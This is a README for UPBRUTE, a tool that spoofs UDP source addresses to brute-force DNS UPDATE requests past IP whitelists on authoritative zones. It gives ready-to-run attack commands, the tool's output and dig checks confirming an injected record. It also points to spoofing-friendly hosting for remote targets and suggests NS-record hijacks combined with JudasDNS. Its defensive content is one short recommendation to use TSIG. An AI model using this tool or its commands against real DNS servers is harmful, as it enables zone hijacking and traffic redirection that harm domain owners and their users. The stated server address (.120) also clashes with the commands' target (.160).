# UPBRUTE
```
:::    ::: :::::::::  :::::::::  :::::::::  :::    ::: ::::::::::: :::::::::: 
:+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+:     :+:     :+:        
+:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+        
+#+    +:+ +#++:++#+  +#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#   
+#+    +#+ +#+        +#+    +#+ +#+    +#+ +#+    +#+     +#+     +#+        
#+#    #+# #+#        #+#    #+# #+#    #+# #+#    #+#     #+#     #+#        
 ########  ###        #########  ###    ###  ########      ###     ########## 

                                           Dynamic DNS Update Bruteforce Tool
```

## Dynamic DNS Update Bruteforce Tool
A tool to bypass IP whitelists for [dynamic updates of a DNS zone](https://tools.ietf.org/html/rfc2136). Performs UDP source address spoofing to bypass IP whitelists which specify who is allowed to update an authoratative zone. Since UDP is a connectionless protocol and all packets are "self-contained", spoofing IP addresses in packets possible when performed via networks that don't employ source address validation.

## Source Address Validation...?
Source address validation, [BCP38](http://www.bcp38.info/index.php/Main_Page), [RFC2827](https://tools.ietf.org/html/rfc2827.html), or whatever you'd like to call it can be summarized as the act of validating packets leaving your network to ensure they are coming from IP addresses that your network advertises. For example, if your network advertises/owns an IP range of `69.252.0.0 - 69.252.127.255` and someone in your datacenter attempts to send a packet with a source address of `93.184.216.34` the correct response would be to immediately drop that packet instead of routing it. Since there is no reason for a packet with a foreign source address to be leaving your network you can immediately stop this spoofing at the beggining of this journey. Failure to do so leaves your network open to abuse as attackers will often abuse this lack of validation to do tricks like [DNS amplification](https://blog.cloudflare.com/deep-inside-a-dns-amplification-ddos-attack/).

This is important because this exact validation will stop `UPBRUTE` from working properly when it's being used against a remote Internet host. In order to properly use this tool you will need to be on a network that does not perform this verification. This is the case on many internal networks (e.g. the host you're targeting is also on the internal network) and can also be found on the general Internet with a little bit of careful searching. Consider the ethical implications of paying for this type of hosting during this process.

Despite this, I believe having this tool is important as it puts the final nail in the coffin to show that you should **never** enable IP whitelisting for DNS updates. Consider using [Secret Key Transaction Authentication for DNS (TSIG)](https://blog.hqcodeshop.fi/archives/76-Doing-secure-dynamic-DNS-updates-with-BIND.html) instead.

## Example IP Whitelist Bypass Usage
The following is an example Bind configuration that would be vulnerable to this tool:

```bind
zone "example.com" IN {
    type master;
    file "/etc/bind/zones/db.example.com";
    allow-update { 10.0.2.123; };
};
```

Since DNS UPDATEs occur via UDP and don't require a handshake to complete they are trivial to spoof source address information for. `UPBRUTE` sends spoofed DNS UPDATE queries from a range of IP addresses in order to force a remote DNS server to update its internal zone. Following the above example configuration you could force an update of the zone by running the following command:

```
$ ./upbrute.py --target 192.168.2.160 -r 10.0.0.0/8 --rrname pwned.example.com. --rrdata 137.137.137.137 --rrtype A -z example.com. --rrttl 60 -b 20000
```

The above command specifies that the Bind DNS server is located at `192.168.2.120` and that we wish to send DNS UPDATE requests from the IP range `10.0.0.0/8`. We're attempting to update/add the `A` record `pwned.example.com` and set it to the IP `137.137.137.137`.

To start, we will verify that the record does not exist first with the `dig` command line DNS tool:

```bash
$ dig A pwned.example.com @192.168.2.160

; <<>> DiG 9.8.3-P1 <<>> A pwned.example.com @192.168.2.160
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 38187
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;pwned.example.com.		IN	A

;; AUTHORITY SECTION:
example.com.		10800	IN	SOA	ns1.example.com. hostmaster.example.com. 2017012620 10800 15 604800 10800

;; Query time: 14 msec
;; SERVER: 192.168.2.160#53(192.168.2.160)
;; WHEN: Tue Feb  7 20:10:01 2017
;; MSG SIZE  rcvd: 86
```

Now we use `UPBRUTE` to send spoofed DNS UPDATE requests from the entire `10.0.0.0/8` range with the following command:

```
$ ./upbrute.py --target 192.168.2.160 -r 10.0.0.0/8 --rrname pwned.example.com. --rrdata 137.137.137.137 --rrtype A -z example.com. --rrttl 60 -b 20000


:::    ::: :::::::::  :::::::::  :::::::::  :::    ::: ::::::::::: :::::::::: 
:+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+:     :+:     :+:        
+:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+        
+#+    +:+ +#++:++#+  +#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#   
+#+    +#+ +#+        +#+    +#+ +#+    +#+ +#+    +#+     +#+     +#+        
#+#    #+# #+#        #+#    #+# #+#    #+# #+#    #+#     #+#     #+#        
 ########  ###        #########  ###    ###  ########      ###     ########## 

                                           Dynamic DNS Update Bruteforce Tool
    
[ STATUS ] Beginning DNS UPDATE bruteforce from range of 10.0.0.0/8
[ STATUS ] Loading up memory buffer with packet data...
[ STATUS ] Sending spoofed DNS UPDATE packets from range 10.0.0.0-10.0.78.31 to target 192.168.2.160...
[ STATUS ] Complete, all packets sent to target! Clearing buffer and continuing...
[ STATUS ] Sent 20000 packets in 43.05 seconds ~464.55/pps!
[ STATUS ] Sending spoofed DNS UPDATE packets from range 10.0.78.32-10.0.156.63 to target 192.168.2.160...
[ STATUS ] Complete, all packets sent to target! Clearing buffer and continuing...
[ STATUS ] Sent 20000 packets in 36.83 seconds ~543.01/pps!
[ STATUS ] Sending spoofed DNS UPDATE packets from range 10.0.156.64-10.0.234.95 to target 192.168.2.160...
[ STATUS ] Complete, all packets sent to target! Clearing buffer and continuing...
[ STATUS ] Sent 20000 packets in 34.76 seconds ~575.34/pps!
[ STATUS ] Sending spoofed DNS UPDATE packets from range 10.0.234.96-10.1.56.127 to target 192.168.2.160...
[ STATUS ] Complete, all packets sent to target! Clearing buffer and continuing...
[ STATUS ] Sent 20000 packets in 35.03 seconds ~570.9/pps!
[ STATUS ] Sending spoofed DNS UPDATE packets from range 10.1.56.128-10.1.134.159 to target 192.168.2.160...
...trimmed for brevity...
```

After a few minutes we've successfully sent all of our DNS UPDATE requests to our target. We can verify that we have successfully update the remote record with the `dig` command line tool once again:

```
$ dig A pwned.example.com @192.168.2.160

; <<>> DiG 9.8.3-P1 <<>> A pwned.example.com @192.168.2.160
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 4038
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;pwned.example.com.		IN	A

;; ANSWER SECTION:
pwned.example.com.	60	IN	A	137.137.137.137

;; AUTHORITY SECTION:
example.com.		86400	IN	NS	ns1.example.com.
example.com.		86400	IN	NS	ns2.example.com.

;; ADDITIONAL SECTION:
ns1.example.com.	86400	IN	A	192.168.2.160
ns2.example.com.	86400	IN	A	192.168.2.160

;; Query time: 11 msec
;; SERVER: 192.168.2.160#53(192.168.2.160)
;; WHEN: Tue Feb  7 20:14:58 2017
;; MSG SIZE  rcvd: 119

```

Success! The remote record has been updated. While this is a trivial example, I'm sure you could imagine a much more dangerous record update which could be performed (such as, `NS`, for example). This attack can be combined with [`JudasDNS`](https://github.com/mandatoryprogrammer/JudasDNS) for some even more fun.

## TODO

* Add additional functionality to detect the correct source IP address which was successful in updating the remote target zone.